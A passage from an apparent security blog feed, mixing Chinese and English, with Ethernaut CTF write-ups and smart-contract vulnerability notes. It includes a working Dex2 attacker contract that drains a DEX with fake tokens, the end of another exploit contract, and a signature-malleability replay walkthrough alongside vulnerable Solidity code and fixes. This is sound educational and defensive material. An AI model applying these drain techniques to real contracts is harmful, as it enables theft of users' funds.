bytes[](2);</span><br><span class="line">        data[0] = deposit_data[0];</span><br><span class="line">        data[1] = abi.encodeWithSelector(level.multicall.selector,deposit_data);</span><br><span class="line">        level.multicall&#123;value:0.001 ether&#125;(data);</span><br><span class="line"></span><br><span class="line">        level.execute(msg.sender, 0.002 ether, &quot;&quot;);</span><br><span class="line">        level.setMaxBalance(uint256(uint160(msg.sender)));</span><br><span class="line">        </span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://moe.photo/images/2023/07/17/image-20230717221415925.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>23.Dex2</title>
      <link href="/2023/07/17/04.Ethernaut%20CTF/23.Dex2/"/>
      <url>/2023/07/17/04.Ethernaut%20CTF/23.Dex2/</url>
      
        <content type="html"><![CDATA[<h1 id="Dex2"><a href="#Dex2" class="headerlink" title="Dex2"></a>Dex2</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：DexTwo合约中有用token1和token2各100个，将它们设置为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>没有限制swap的币对，因此任何山寨币都可以和token1、token2进行swap。</li><li>修复：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br></pre></td></tr></table></figure><ul><li>思路：创建两个山寨币，然后分别给题目合约1token，这样流动池方法<code>getSwapAmount()</code>计算出来的比例（山寨币：token[1,2]）就是1：100，这样的话，我们就可以用1个山占比来拿走100个token1和token2。</li></ul><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attacker&#123;</span><br><span class="line">    IDexTwo public level = IDexTwo(0x0000000000000000000000000000000000000000); // gas save</span><br><span class="line">    FakeToken public faketoken1 = FakeToken(0x0000000000000000000000000000000000000000); // gas save</span><br><span class="line">    FakeToken public faketoken2 = FakeToken(0x0000000000000000000000000000000000000000); // gas save</span><br><span class="line"></span><br><span class="line">    constructor(IDexTwo _addr) public &#123;</span><br><span class="line">        level = _addr;</span><br><span class="line">        faketoken1 = new FakeToken();</span><br><span class="line">        faketoken2 = new FakeToken();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        faketoken1.transfer(address(level), 1); // add liquidity</span><br><span class="line">        faketoken2.transfer(address(level), 1); // add liquidity</span><br><span class="line"></span><br><span class="line">        faketoken1.approve(address(level), 1); // prepare for swap</span><br><span class="line">        faketoken2.approve(address(level), 1); // prepare for swap</span><br><span class="line"></span><br><span class="line">        level.swap(address(faketoken1), address(level.token1()), 1); // swap</span><br><span class="line">        level.swap(address(faketoken2), address(level.token2()), 1); // swap</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IDexTwo &#123;</span><br><span class="line">    function swap(address, address, uint256) external; // 🐎的，注意不能写成uint，否则swap方法会调用失败，一定要写全uint256</span><br><span class="line">    function token1() external view returns(address);</span><br><span class="line">    function token2() external view returns(address);</span><br><span class="line">    function approve(address, uint256) external;</span><br><span class="line">    function transfer(address,uint256) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FakeToken is ERC20 &#123;</span><br><span class="line">    constructor() ERC20(&quot;MyToken&quot;, &quot;MTK&quot;) &#123;</span><br><span class="line">        _mint(msg.sender,10000000000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://moe.photo/images/2023/07/17/image-20230717193657975.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>44.delete mapping</title>
      <link href="/2023/07/16/00.security/44.delete%20mapping/"/>
      <url>/2023/07/16/00.security/44.delete%20mapping/</url>
      
        <content type="html"><![CDATA[<h1 id="delete-mapping"><a href="#delete-mapping" class="headerlink" title="delete mapping"></a>delete mapping</h1><p>1.setBalancesStruct</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">2023-07-16 16:56:41.633 | SUCCESS  | main.Blockchain:__init__:38 - </span><br><span class="line">[Chain][Initialize] Connected to [HTTP://127.0.0.1:8545]</span><br><span class="line">----------------------------------------------------------------------------------------------------</span><br><span class="line">2023-07-16 16:56:41.696 | SUCCESS  | main.Blockchain:GetStorage:281 - </span><br><span class="line">[Chain][GetStorage]</span><br><span class="line">[Address] 0x2Eb99D1DeBD3D92b3c6bfC85b09e8864E14d1606</span><br><span class="line">[SlotIndex] 53527352400092408662675107845356305355237133692174925906457297885835689536801</span><br><span class="line">[Value]  [Hex][0x15a26f4a022b81c85ace9d82c223237d53a7c885] &lt;=&gt; [Dec][123511221556980525555710516015044264263871350917]</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">2023-07-16 16:56:41.711 | SUCCESS  | main.Blockchain:GetStorage:281 - </span><br><span class="line">[Chain][GetStorage]</span><br><span class="line">[Address] 0x2Eb99D1DeBD3D92b3c6bfC85b09e8864E14d1606</span><br><span class="line">[SlotIndex] 53527352400092408662675107845356305355237133692174925906457297885835689536802</span><br><span class="line">[Value]  [Hex][0x00] &lt;=&gt; [Dec][0]</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">2023-07-16 16:56:41.727 | SUCCESS  | main.Blockchain:GetStorage:281 - </span><br><span class="line">[Chain][GetStorage]</span><br><span class="line">[Address] 0x2Eb99D1DeBD3D92b3c6bfC85b09e8864E14d1606</span><br><span class="line">[SlotIndex] 53527352400092408662675107845356305355237133692174925906457297885835689536803</span><br><span class="line">[Value]  [Hex][0x09] &lt;=&gt; [Dec][9]</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">2023-07-16 16:56:41.743 | SUCCESS  | main.Blockchain:GetStorage:281 - </span><br><span class="line">[Chain][GetStorage]</span><br><span class="line">[Address] 0x2Eb99D1DeBD3D92b3c6bfC85b09e8864E14d1606</span><br><span class="line">[SlotIndex] 33426032559509467770105053423268718544989244874896990205098647808323176206627</span><br><span class="line">[Value]  [Hex][0x0a] &lt;=&gt; [Dec][10]</span><br></pre></td></tr></table></figure><p>2.remove</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">2023-07-16 16:56:57.078 | SUCCESS  | main.Blockchain:__init__:38 - </span><br><span class="line">[Chain][Initialize] Connected to [HTTP://127.0.0.1:8545]</span><br><span class="line">----------------------------------------------------------------------------------------------------</span><br><span class="line">2023-07-16 16:56:57.142 | SUCCESS  | main.Blockchain:GetStorage:281 - </span><br><span class="line">[Chain][GetStorage]</span><br><span class="line">[Address] 0x2Eb99D1DeBD3D92b3c6bfC85b09e8864E14d1606</span><br><span class="line">[SlotIndex] 53527352400092408662675107845356305355237133692174925906457297885835689536801</span><br><span class="line">[Value]  [Hex][0x00] &lt;=&gt; [Dec][0]</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">2023-07-16 16:56:57.158 | SUCCESS  | main.Blockchain:GetStorage:281 - </span><br><span class="line">[Chain][GetStorage]</span><br><span class="line">[Address] 0x2Eb99D1DeBD3D92b3c6bfC85b09e8864E14d1606</span><br><span class="line">[SlotIndex] 53527352400092408662675107845356305355237133692174925906457297885835689536802</span><br><span class="line">[Value]  [Hex][0x00] &lt;=&gt; [Dec][0]</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">2023-07-16 16:56:57.175 | SUCCESS  | main.Blockchain:GetStorage:281 - </span><br><span class="line">[Chain][GetStorage]</span><br><span class="line">[Address] 0x2Eb99D1DeBD3D92b3c6bfC85b09e8864E14d1606</span><br><span class="line">[SlotIndex] 53527352400092408662675107845356305355237133692174925906457297885835689536803</span><br><span class="line">[Value]  [Hex][0x00] &lt;=&gt; [Dec][0]</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">2023-07-16 16:56:57.190 | SUCCESS  | main.Blockchain:GetStorage:281 - </span><br><span class="line">[Chain][GetStorage]</span><br><span class="line">[Address] 0x2Eb99D1DeBD3D92b3c6bfC85b09e8864E14d1606</span><br><span class="line">[SlotIndex] 33426032559509467770105053423268718544989244874896990205098647808323176206627</span><br><span class="line">[Value]  [Hex][0x0a] &lt;=&gt; [Dec][10]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>A deletion in a structure containing a mapping will not delete the mapping (see the <a href="https://solidity.readthedocs.io/en/latest/types.html##delete">Solidity documentation</a>). The remaining data may be used to compromise the contract.</p><p><code>remove</code> deletes an item of <code>stackBalance</code>. The mapping <code>balances</code> is never deleted, so <code>remove</code> does not work as intended.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.5.17;</span><br><span class="line">contract A&#123;</span><br><span class="line"></span><br><span class="line">    struct BalancesStruct&#123;</span><br><span class="line">        address owner;</span><br><span class="line">        mapping(address =&gt; uint) balances;</span><br><span class="line">        uint256 hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; BalancesStruct) public stackBalance;</span><br><span class="line"></span><br><span class="line">    function setBalancesStruct() public &#123;</span><br><span class="line">        BalancesStruct memory x;</span><br><span class="line">        x.owner = msg.sender;</span><br><span class="line">        x.hello = 9;</span><br><span class="line">        stackBalance[msg.sender] = x;</span><br><span class="line">        stackBalance[msg.sender].balances[msg.sender] = 10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function remove() public &#123;</span><br><span class="line">        delete stackBalance[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getStorageLocationForKey(address _key,uint256 _slot) public pure returns(bytes32) &#123;</span><br><span class="line">// keccak256( msg.sender, keccak256(msg.sender,0) )</span><br><span class="line">        return keccak256(abi.encode(_key, _slot));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Recommendation"><a href="#Recommendation" class="headerlink" title="Recommendation"></a>Recommendation</h2><p>Use a lock mechanism instead of a deletion to disable structure containing a mapping.</p><p>or use high solidity compiler</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>17.SWC-117_Signature Malleability</title>
      <link href="/2023/07/15/09.SWC/17.SWC-117_Signature%20Malleability/"/>
      <url>/2023/07/15/09.SWC/17.SWC-117_Signature%20Malleability/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-117-Signature-Malleability"><a href="#SWC-117-Signature-Malleability" class="headerlink" title="SWC-117_Signature Malleability"></a>SWC-117_Signature Malleability</h1><p>Signature Malleability</p><ul><li><p><strong>Description</strong>: The implementation of a cryptographic signature system in Ethereum contracts often assumes that the signature is unique, but signatures can be altered without the possession of the private key and still be valid. The EVM specification defines several so-called ‘precompiled’ contracts one of them being <code>ecrecover</code> which executes the elliptic curve public key recovery. A malicious user can slightly modify the three values <em>v</em>, <em>r</em> and <em>s</em> to create other valid signatures. A system that performs signature verification on contract level might be susceptible to attacks if the signature is part of the signed message hash. Valid signatures could be created by a malicious user to replay previously signed messages.</p></li><li><p><strong>Remediation</strong>: A signature should never be included into a signed message hash to check if previously messages have been processed by the contract.</p></li></ul><p>vulnerability contract 1:</p><p>我的理解</p><blockquote><p>（1）这个合约txid如果包含sig，那么sig可以最多被修改成四个不同的，这四个不同的sig对应的消息m是相同的，也就是说value,to,gasprice,nonce是相同的。<br>（2）然后这四个sig都可以执行transfer方法，因为算出来的txid不一样，但是解析出来的签名者是一样的，因此该签名者会被最多扣除4次余额。<br>（3）照这么说，以太坊的消息为啥不会被重放呢？因为以太坊会拒绝相同的nonce，无法重放。但是在这里不存在这个问题<br>（4）然后这个SWC把sig从txid中的hash移除了，但是这会造成DoS（因为同一个value,to,gasprice,nonce被执行之前，不能被其他人再次执行），在GitHub讨论的修改方法如链接：<a href="https://github.com/SmartContractSecurity/SWC-registry/issues/173">https://github.com/SmartContractSecurity/SWC-registry/issues/173</a></p><p>ECDSA链接：<br>4篇连载：<a href="https://coders-errand.com/malleability-ecdsa-signatures/">https://coders-errand.com/malleability-ecdsa-signatures/</a><br><a href="https://eklitzke.org/bitcoin-transaction-malleability">https://eklitzke.org/bitcoin-transaction-malleability</a><br><a href="https://hackernoon.com/what-is-the-math-behind-elliptic-curve-cryptography-f61b25253da3">https://hackernoon.com/what-is-the-math-behind-elliptic-curve-cryptography-f61b25253da3</a><br><a href="https://www.derpturkey.com/inherent-malleability-of-ecdsa-signatures/">https://www.derpturkey.com/inherent-malleability-of-ecdsa-signatures/</a></p></blockquote><p>然后我去<a href="https://ethereum.stackexchange.com/questions/152375/swc-117-signature-and-ecrecover/152386#152386">stackoverflow</a>问了，答案很清晰</p><blockquote><p>This is how someone can exploit it:</p><ol><li>Alice sends some tokens to Bob using the <code>transfer</code> function. All normal so far, since <code>txid</code> wasn’t seen before then <code>signatureUsed[txid] == false</code> and the payment goes through.</li><li>Bob is our exploiter. He picks the <code>signature = (r, s, v)</code> used by Alice and creates a new one <code>signature2 = (r2, s2, v2)</code> like this:</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r2 = r</span><br><span class="line">s2 = s</span><br><span class="line">v2 = v&lt;<span class="number">27</span> ? v+<span class="number">27</span> : v-<span class="number">27</span></span><br></pre></td></tr></table></figure><ol><li>Bob calls <code>transfer</code> with the same parameters used by Alice but using <code>signature2</code>. <code>txid</code> will be different than before so <code>signatureUsed[txid] == false</code>. The signature is also recognized as a valid Alice signature (see how <code>ecrecoverFromSig</code> handles <code>v</code> …). So the payment goes through.</li><li>At then end Bob stole an extra payment from Alice.</li></ol><p>The root of the problem is that it’s possible to use a signature to make another valid one. This opens up to “replay attacks”.</p><p>This particular code tries to prevent replay attacks by checking if <code>txid</code> was seen before. However <code>txid</code> was calculated using the signature, thus failing to prevent this exploit. The fix is just to remove the signature from <code>txid</code>.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract transaction_malleablity&#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    mapping(bytes32 =&gt; bool) signatureUsed;</span><br><span class="line"></span><br><span class="line">    constructor(address[] owners, uint[] init)&#123;</span><br><span class="line">        require(owners.length == init.length);</span><br><span class="line">        for(uint i=0; i &lt; owners.length; i ++)&#123;</span><br><span class="line">        balances[owners[i]] = init[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(bytes _signature, address _to, uint256 _value, uint256 _gasPrice, uint256 _nonce) public returns (bool)&#123;</span><br><span class="line">        bytes32 txid = keccak256(</span><br><span class="line">            abi.encodePacked(</span><br><span class="line">                getTransferHash(</span><br><span class="line">                    _to, _value, _gasPrice, _nonce</span><br><span class="line">                ), </span><br><span class="line">                _signature</span><br><span class="line">            )</span><br><span class="line">        ); // something wrong</span><br><span class="line">        </span><br><span class="line">        require(!signatureUsed[txid]);</span><br><span class="line"></span><br><span class="line">        address from = recoverTransferPreSigned(_signature, _to, _value, _gasPrice, _nonce);</span><br><span class="line">        require(balances[from] &gt; _value);</span><br><span class="line"></span><br><span class="line">        balances[from] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        signatureUsed[txid] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function recoverTransferPreSigned(bytes _sig, address _to, uint256 _value, uint256 _gasPrice, uint256 _nonce) public view returns (address recovered) &#123;</span><br><span class="line">        return ecrecoverFromSig(getSignHash(getTransferHash(_to, _value, _gasPrice, _nonce)), _sig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getTransferHash(address _to, uint256 _value, uint256 _gasPrice, uint256 _nonce) public view returns (bytes32 txHash) &#123;</span><br><span class="line">        return keccak256(address(this), bytes4(0x1296830d), _to, _value, _gasPrice, _nonce);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSignHash(bytes32 _hash) public pure returns (bytes32 signHash)&#123;</span><br><span class="line">        return keccak256(&quot;\x19Ethereum Signed Message:\n32&quot;, _hash);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ecrecoverFromSig(bytes32 hash, bytes sig) public pure returns (address recoveredAddress) &#123;</span><br><span class="line">        bytes32 r;</span><br><span class="line">        bytes32 s;</span><br><span class="line">        uint8 v;</span><br><span class="line">        if (sig.length != 65) return address(0);</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            r := mload(add(sig, 32))</span><br><span class="line">            s := mload(add(sig, 64))</span><br><span class="line">            v := byte(0, mload(add(sig, 96)))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (v &lt; 27) &#123;</span><br><span class="line">          v += 27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (v != 27 &amp;&amp; v != 28) return address(0);</span><br><span class="line">        return ecrecover(hash, v, r, s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fix</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// instead of: mapping(bytes32 =&gt; bool) signatureUsed;</span><br><span class="line">mapping(address =&gt; mapping(uint256 =&gt; bool)) saltsUsed;</span><br><span class="line"></span><br><span class="line">function transfer(</span><br><span class="line">  bytes _signature,</span><br><span class="line">  address _to,</span><br><span class="line">  uint256 _value,</span><br><span class="line">  uint256 _gasPrice,</span><br><span class="line">  uint256 _salt</span><br><span class="line">) public returns (bool) &#123;</span><br><span class="line">  address from = recoverTransferPreSigned(_signature, _to, _value, _gasPrice, _salt);</span><br><span class="line"> </span><br><span class="line">  require(!saltsUsed[from][_salt]);</span><br><span class="line">  </span><br><span class="line">  require(balances[from] &gt; _value);</span><br><span class="line"></span><br><span class="line">  balances[from] -= _value;</span><br><span class="line">  balances[_to] += _value;</span><br><span class="line"></span><br><span class="line">  saltsUsed[from][_salt] = true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">import 